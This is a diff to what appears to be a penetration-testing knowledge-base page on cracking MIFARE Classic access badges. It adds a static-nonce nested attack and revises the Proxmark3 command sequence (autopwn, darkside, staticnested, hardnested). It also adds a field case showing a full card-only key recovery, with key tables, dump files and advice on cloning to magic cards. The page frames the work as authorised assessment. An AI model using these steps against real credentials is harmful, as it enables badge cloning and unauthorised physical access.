@@ -52,6 +52,15 @@ attacks:
     summary: >-
       Given one known key and a predictable PRNG, recovers the remaining sector
       keys by filtering nonce guesses through the Crypto1 parity keystream leak.
+  - name: Static-nonce nested (statiCnested)
+    refs:
+      - proxmark3-iceman
+    impact: Recovers the remaining sector keys on a card that returns a constant tag nonce — the case where plain nested and darkside both fail — given one known key, which on these clones is almost always a default.
+    preconditions: 'A MIFARE Classic / Fudan clone whose PRNG returns a fixed nonce every authentication (hf mf info → "Static nonce... yes"), plus one known sector key; default keys are present on most such cards.'
+    summary: >-
+      Variant of the nested attack for static-nonce cards: with the tag nonce
+      constant, derives the set of sector-key candidates consistent with it and
+      verifies them online against the card, seeded by one known key.
   - name: Hardnested attack
     refs:
       - meijer2015hardnested
@@ -146,9 +155,9 @@ tools:
 resources:
   - RFSAM-RES-13
   - RFSAM-RES-14
-reviewStatus: reviewed
+reviewStatus: verified
 confidence: high
-lastResearched: 2026-06-14
+lastResearched: 2026-06-18
 ---
 
 ## Mechanism
@@ -158,6 +167,7 @@ MIFARE Classic protects each sector with a pair of 48-bit Crypto1 keys (A and B)
 The applicable attack depends on the card's nonce behaviour, so the first job of this control is to classify it:
 
 - **Original weak PRNG (most legacy 1K/4K).** The card nonce comes from a 16-bit LFSR that the reader can advance to a known value, and the card leaks a NACK on bad parity. The **darkside** attack uses these two leaks to recover a first key card-only, with no reader and no prior key, in a few minutes [`courtois2009darkside`]. Once any one key is known, the **nested** attack triggers sector-to-sector ("nested") authentications and recovers every remaining key from the encrypted-nonce parity leak [`garcia2009pickpocket`].
+- **Static nonce (many Fudan-based clones).** Some MIFARE-compatible cards return a *constant* tag nonce on every authentication. A fixed nonce defeats both darkside and the plain nested attack — each needs the nonce to vary to correlate keystream — but it does not save the card: given one known sector key (default keys are almost always present on these clones), the **staticnested** attack derives the candidate keys consistent with that constant nonce and verifies them against the card, recovering the remaining sectors in seconds [`proxmark3-iceman`]. `hf mf info` flags this case as `Static nonce... yes`; do not confuse it with the *static encrypted nonce* of the FM11RF08S below, which prints differently and is a separate attack.
 - **Hardened PRNG (MIFARE Classic EV1 and hardened clones).** These emit truly-random nonces, defeating darkside and plain nested. The **hardnested** attack is a ciphertext-only statistical cryptanalysis that, given one known key, collects encrypted nonces and reduces the search from 2^48 to roughly 2^30, recovering a key in about five minutes on a single laptop core [`meijer2015hardnested`].
 - **Static encrypted nonce (Fudan FM11RF08S and relatives).** A 2020-era "MIFARE-compatible" variant added a static-encrypted-nonce countermeasure specifically to thwart all known card-only attacks. In 2024 this was broken, and a **hardware backdoor key common to all FM11RF08S cards** was recovered: anyone who knows it can authenticate to and dump user sectors without the user keys, in a few minutes of card access [`teuwen2024fm11rf08s`, `teuwen2024blog`].
 
@@ -174,7 +184,7 @@ All steps below are active interrogation of a credential. Run them only against 
    [usb] pm3 --> hf 14a info
    [usb] pm3 --> hf mf info
    ```
-   Expected: `hf 14a info` prints the UID, SAK, ATQA and the chip guess (e.g. *MIFARE Classic 1K*). `hf mf info` reports the PRNG / nonce class — read it as **weak** (darkside/nested apply) vs **hard / static encrypted nonce** (hardnested or the FM11RF08S techniques apply). Note whether the UID is 4-byte or 7-byte and whether the card is a known Fudan clone.
+   Expected: `hf 14a info` prints the UID, SAK, ATQA and the chip guess (e.g. *MIFARE Classic 1K*). `hf mf info` reports the PRNG / nonce class — read it as **weak** (`darkside`/`nested`), **static nonce** (`Static nonce... yes` → `staticnested`), **hardened/random** (`hardnested`), or **static *encrypted* nonce** (FM11RF08S techniques). It also fingerprints the chip (e.g. *Fudan based card*) and surfaces any sector already on a default key. Note whether the UID is 4-byte or 7-byte and whether the card is a known Fudan clone.
 
 2. **Try default and dictionary keys first.** Many systems never change them:
    ```
@@ -182,19 +192,20 @@ All steps below are active interrogation of a credential. Run them only against 
    ```
    Expected: a per-sector table of recovered keys A/B. If every sector resolves here, skip straight to step 6 — no cryptanalysis was needed (a finding in itself).
 
-3. **Run the matching card-only attack.** For weak-PRNG cards with no known key, bootstrap one with darkside, or let `autopwn` orchestrate the whole chain:
+3. **Run the matching card-only attack.** Let `hf mf autopwn` orchestrate the chain — it reads the PRNG class from step 1, tries the dictionary, and picks the attack per sector. The explicit single-attack forms are also shown:
    ```
-   [usb] pm3 --> hf mf darkside
    [usb] pm3 --> hf mf autopwn
+   [usb] pm3 --> hf mf darkside                                      # weak PRNG, no known key — bootstrap a first key
+   [usb] pm3 --> hf mf staticnested --1k --blk 0 -a -k FFFFFFFFFFFF  # static nonce — seed from a known key
    ```
-   Expected: `darkside` returns a recovered key for one sector after a few minutes; `autopwn` then chains darkside → nested → key-table → dump automatically. With the offline tools instead, on a PN532/ACR122U: `mfoc -O dump.mfd` (nested, needs one known/default key) or `mfcuk -C -R 0:A -s 250 -S 250` (darkside bootstrap).
+   Expected: for a **weak-PRNG** card with no known key, `darkside` returns a first key in a few minutes and `autopwn` then chains nested → key-table → dump. For a **static-nonce** card (most Fudan clones — `hf mf info` printed `Static nonce... yes`), darkside and plain nested do not apply; `autopwn` seeds from any default key it finds and runs `staticnested` for the rest. Read *which* attack actually recovered each key from the result column of the key table — the legend is `D`:dictionary · `S`:darkside · `N`:nested · `H`:hardnested · **`C`:statiCnested** · `R`:reused · `U`:user. Offline tools on a PN532/ACR122U cover only the weak path: `mfoc -O dump.mfd` (nested, needs one known/default key) or `mfcuk -C -R 0:A -s 250 -S 250` (darkside) — neither implements the static-nonce attack, so a static-nonce card needs the Proxmark.
 
 4. **For hardened (EV1 / hard-PRNG) cards, use hardnested with one known key.** If a default key was found for any sector in step 2, recover the rest:
    ```
    [usb] pm3 --> hf mf nested
    [usb] pm3 --> hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
    ```
-   Expected: `nested` handles predictable-PRNG cards; `hardnested` collects nonces and returns the target key in roughly five minutes [`meijer2015hardnested`]. (`autopwn` selects nested vs hardnested for you based on the step-1 classification.)
+   Expected: `nested` handles predictable-PRNG cards; `hardnested` collects nonces and returns the target key in roughly five minutes [`meijer2015hardnested`]. (`autopwn` selects nested, staticnested, or hardnested for you based on the step-1 classification.)
 
 5. **Reader-side path (card unreachable, reader available).** Sniff a genuine authentication and recover the key offline:
    ```
@@ -212,14 +223,39 @@ All steps below are active interrogation of a credential. Run them only against 
 
 ## Field case
 
-Illustrative walkthrough — substitute the values you capture. A representative engagement against an office MIFARE Classic 1K badge, with written authorisation and the badge in hand:
+Real capture — a Fudan-based MIFARE Classic 1K clone (FNUID, fixed UID) on the bench, decrypted end-to-end with a Proxmark3 (Iceman) in 37 seconds. This is the **static-nonce** branch above, demonstrated.
 
-1. `hf 14a info` returned *MIFARE Classic 1K (4-byte UID)*; `hf mf info` classified the PRNG as **weak**.
-2. `hf mf chk *1 ? d` recovered sector 0 key A as the transport default `A0A1A2A3A4A5`, but sectors 1–15 did not resolve from the dictionary.
-3. With one known key and a weak PRNG, `hf mf autopwn` chained nested authentication off sector 0 and recovered all 32 sector keys in under two minutes, then wrote `hf-mf-<UID>-dump.bin` and the keyfile.
-4. Parsing the dump showed the access-control payload in sector 1 (a [FILL: facility/card-number layout for this specific deployment — not measured here]); the keys A/B for every sector were now known, so the badge was fully clonable to a magic card.
+1. `hf mf info` fingerprinted it as a **Fudan based card**, Classic 1K — UID `8F 05 E5 D8`, ATQA `0004`, SAK `08`, block 0 `8F05E5D8B70804006263646566676869` (the trailing `6263646566676869` is ASCII `bcdefghi`, the placeholder manufacturer bytes these clones ship with). The PRNG section reported a **plain static nonce**, not a static *encrypted* nonce, and sector 0 already authenticated with the transport default:
+   ```
+   [#] Static nonce....... 01200145
+   [+] Static nonce... yes
+   [+] Sector 0 key A... FFFFFFFFFFFF
+   [+] Sector 0 key B... FFFFFFFFFFFF
+   ```
 
-The finding such an engagement records is *all 16 sectors' Crypto1 keys recovered card-only in under two minutes, one of them still the transport default* — i.e. the credential provides no cryptographic protection. The hardened path differs only in the attack chosen: against an EV1 card, step 3 is replaced by `hf mf hardnested` seeded with the one default key, recovering a target key in about five minutes [`meijer2015hardnested`]; against an FM11RF08S clone, the static-encrypted-nonce techniques and the shared backdoor key apply instead [`teuwen2024fm11rf08s`]. The `[FILL: …]` access-control payload above is intentionally left unmeasured — substitute the facility/card-number layout you actually read; do not fabricate one.
+2. `hf mf autopwn` recovered every key in one pass. The dictionary resolved 15 of the 16 sectors (0 and 2–15, A and B) to the default `FFFFFFFFFFFF`. Sector 1 held a non-default key and fell to **staticnested** — autopwn derived `59578` candidate keys consistent with the static nonce, verified them online at ~160 keys/s, and hit the valid one inside the first thousand:
+   ```
+   [+] target block    4 key type A -- found valid key [ 8A19D40CF2B5 ]
+   [+] Target sector   1 key type A -- found valid key [ 8A19D40CF2B5 ]
+   ```
+   The result column confirms which attack recovered each sector — `D` (dictionary) for the 15 default sectors, **`C` (statiCnested)** for sector 1:
+   ```
+   [+]  Sec | Blk | key A        |res| key B        |res
+   [+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+   [+]  001 | 007 | 8A19D40CF2B5 | C | 8A19D40CF2B5 | C
+   [+]  002 | 011 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+   [+]  ... | ... | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+   [+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
+   ```
+
+3. With all 32 keys (16 sectors × A/B) recovered, autopwn wrote the keyfile and a full 1024-byte dump:
+   ```
+   [+] Found keys have been dumped to `hf-mf-8F05E5D8-key.bin`
+   [+] Saved 1024 bytes to binary file `hf-mf-8F05E5D8-dump.bin`
+   [=] Autopwn execution time: 37 seconds
+   ```
+
+The finding this records: **every Crypto1 key on a real Classic 1K recovered card-only in 37 seconds** — 15 sectors still on the transport default, and the one non-default key (`8A19D40CF2B5`) recovered by the static-nonce nested attack that plain nested and darkside cannot perform. The card offers no cryptographic protection; with the keys and dump in hand it is fully clonable to a magic Gen1a/Gen2 card or emulated from a Chameleon Ultra (see RFSAM-RES-14). The other nonce classes differ only in the attack chosen: a weak-PRNG card with no default key starts with `hf mf darkside`; a hardened EV1 card uses `hf mf hardnested` seeded with one known key, recovering a target key in about five minutes [`meijer2015hardnested`]; an FM11RF08S clone instead falls to the static-*encrypted*-nonce techniques and the shared hardware backdoor key [`teuwen2024fm11rf08s`].
 
 ## Remediation
 
